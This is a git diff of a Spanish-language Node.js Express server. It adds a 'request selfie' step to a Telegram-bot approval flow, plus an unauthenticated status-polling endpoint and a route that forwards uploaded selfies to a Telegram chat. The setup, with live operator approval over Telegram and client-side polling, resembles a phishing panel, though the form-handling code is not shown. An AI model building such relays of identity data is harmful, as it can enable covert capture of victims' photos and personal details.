@@ -6,6 +6,7 @@ const cors     = require('cors');
 const { Pool } = require('pg');
 const fetch    = require('node-fetch');
 const path     = require('path');
+const FormData = require('form-data');
 
 const app  = express();
 const PORT = process.env.PORT || 3000;
@@ -35,8 +36,10 @@ async function sendTelegram(clienteId, data) {
   const botones = {
     inline_keyboard: [[
       { text: '✅ Aprobar',      callback_data: `aprobar:${clienteId}` },
-      { text: '❌ Rechazar',     callback_data: `rechazar:${clienteId}` },
-      { text: '⏳ En revisión',  callback_data: `revision:${clienteId}` }
+      { text: '❌ Rechazar',     callback_data: `rechazar:${clienteId}` }
+    ], [
+      { text: '⏳ En revisión',  callback_data: `revision:${clienteId}` },
+      { text: '📸 Pedir Selfie', callback_data: `selfie:${clienteId}` }
     ]]
   };
 
@@ -58,7 +61,8 @@ async function editTelegram(messageId, clienteId, nuevoEstado) {
   const emojis = {
     aprobado:    '✅ Aprobado',
     rechazado:   '❌ Rechazado',
-    en_revision: '⏳ En revisión'
+    en_revision: '⏳ En revisión',
+    pedir_selfie: '📸 Solicitando Selfie'
   };
 
   const label = emojis[nuevoEstado] || nuevoEstado;
@@ -140,6 +144,69 @@ app.post('/submit', async (req, res) => {
   }
 });
 
+// GET /api/status/:id → endpoint para polling desde el frontend
+app.get('/api/status/:id', async (req, res) => {
+  try {
+    const { id } = req.params;
+    const { rows } = await pool.query('SELECT estado FROM clientes WHERE id = $1', [id]);
+    if (!rows.length) {
+      return res.status(404).json({ error: 'No encontrado' });
+    }
+    res.json({ estado: rows[0].estado });
+  } catch (error) {
+    console.error('Error en /api/status:', error);
+    res.status(500).json({ error: 'Error interno' });
+  }
+});
+
+// POST /api/selfie → recibir base64, enviar a Telegram como foto
+app.post('/api/selfie', async (req, res) => {
+  const { cliente_id, selfie } = req.body;
+  if(!cliente_id || !selfie) return res.status(400).json({ok: false, mensaje: 'Faltan datos'});
+
+  try {
+    // 1. Limpiar el base64
+    const base64Data = selfie.replace(/^data:image\/\w+;base64,/, "");
+    const buffer = Buffer.from(base64Data, "base64");
+
+    // 2. Preparar payload tipo form-data
+    const form = new FormData();
+    form.append('chat_id', CHAT_ID);
+    form.append('photo', buffer, { filename: `selfie_${cliente_id}.jpg`, contentType: 'image/jpeg' });
+    form.append('caption', `📸 *Nueva Selfie Recibirda*\n🆔 Cliente: \`${cliente_id}\`\n\n¿Qué acción tomar con este cliente ahora?`);
+    form.append('parse_mode', 'Markdown');
+    
+    // Botones para la Selfie
+    form.append('reply_markup', JSON.stringify({
+      inline_keyboard: [[
+        { text: '✅ Aprobar Todo', callback_data: `aprobar:${cliente_id}` },
+        { text: '❌ Rechazar',     callback_data: `rechazar:${cliente_id}` }
+      ], [
+        { text: '⏳ Seguir en revisión', callback_data: `revision:${cliente_id}` }
+      ]]
+    }));
+
+    // 3. Enviar a Telegram
+    const tgRes = await fetch(`${TG_API}/sendPhoto`, {
+      method: 'POST',
+      body: form,
+      headers: form.getHeaders()
+    });
+
+    const tbData = await tgRes.json();
+    if(!tbData.ok) throw new Error("Error enviando foto a Telegram: " + tbData.description);
+
+    // 4. Actualizar a 'en_revision' para que el polling del cliente no falle, ni se quede trabado en 'pedir_selfie'
+    await pool.query('UPDATE clientes SET estado = $1 WHERE id = $2', ['en_revision', cliente_id]);
+
+    res.json({ok: true, mensaje: 'Selfie enviada correctamente'});
+
+  } catch (e) {
+    console.error('Error procesando selfie:', e);
+    res.status(500).json({ok: false, mensaje: 'Error procesando la imagen en el servidor'});
+  }
+});
+
 // POST /webhook → recibir callbacks de botones de Telegram
 app.post('/webhook', async (req, res) => {
   const update = req.body;
@@ -156,7 +223,8 @@ app.post('/webhook', async (req, res) => {
     const estadoMap = {
       aprobar:  'aprobado',
       rechazar: 'rechazado',
-      revision: 'en_revision'
+      revision: 'en_revision',
+      selfie:   'pedir_selfie'
     };
 
     const nuevoEstado = estadoMap[accion];
